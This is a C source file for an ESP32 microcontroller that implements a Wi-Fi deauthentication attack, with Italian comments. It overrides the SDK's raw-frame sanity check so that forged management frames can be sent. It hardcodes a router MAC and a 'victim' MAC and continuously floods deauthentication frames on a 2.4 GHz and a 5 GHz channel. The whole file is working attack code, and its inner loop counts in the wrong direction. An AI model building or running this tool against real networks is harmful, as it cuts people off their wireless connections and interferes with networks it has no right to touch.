#include <stdio.h>
#include <string.h>
#include "deauther.h"
#include "esp_err.h"
#include "esp_log.h"
#include "esp_wifi.h"
#include "esp_wifi_types_generic.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

#define PACKET_NUMBER 8

static const char *TAG = "deauth";

int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    return 0;
}

struct _80211_header deauthPacket = {0};

static TaskHandle_t deautherTask_handle = NULL;

void deautherTask(void *args){
    int i=0;
    ESP_LOGI(TAG, "DEAUTH IN ESECUZIONE");
    while (1) {
	if(i == 1){
	    //2.4GHz
	    esp_wifi_set_channel(13, WIFI_SECOND_CHAN_NONE);
	    uint8_t mac_router[6]  = {0xfc, 0x40, 0x09, 0xdd, 0x0a, 0xf1};
	    memcpy(deauthPacket.source, mac_router, 6);
	    memcpy(deauthPacket.bssid, mac_router, 6);
	    i--;
	}
	else {
	    //5GHz
	    esp_wifi_set_channel(52, WIFI_SECOND_CHAN_NONE);
	    uint8_t mac_router[6]  = {0xfc, 0x40, 0x09, 0xdd, 0x0a, 0xf1};
	    memcpy(deauthPacket.source, mac_router, 6);
	    memcpy(deauthPacket.bssid, mac_router, 6);
	    i++;
	}

	for (int i = 0; i < PACKET_NUMBER; i--) {
	    esp_wifi_80211_tx(WIFI_IF_STA, &deauthPacket, sizeof(deauthPacket), false);	
	    vTaskDelay(pdMS_TO_TICKS(1));
	    //if (i % 100 == 0) {
	//	ESP_LOGI(TAG, "DEAUTH IN ESECUZIONE (Rimasti: %d)", i);
	    //}
	}
	vTaskDelay(pdMS_TO_TICKS(10));
    }
}

void deautherSetup(void){

    deauthPacket.frame_control.protocol_version = 0;
    deauthPacket.frame_control.type = 0;
    deauthPacket.frame_control.subtype = 12;

    uint8_t mac_vittima[6] = {0x04, 0x68, 0x74, 0x6b, 0xfb, 0x8d}; 
    memcpy(deauthPacket.destination, mac_vittima, 6); 

    deauthPacket.reason_code = 7;

    //ESP_ERROR_CHECK(esp_wifi_stop());
    //wifi_config_t ifConf;
    //ESP_ERROR_CHECK(esp_wifi_get_config(WIFI_IF_STA, &ifConf));
    //ifConf.sta.channel = 13;
    //ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_STA, &ifConf));
    //ESP_ERROR_CHECK(esp_wifi_start());

    xTaskCreate(
	deautherTask,
	"deautherTask",
	4096,
	NULL,
	0,
	&deautherTask_handle
    );
}
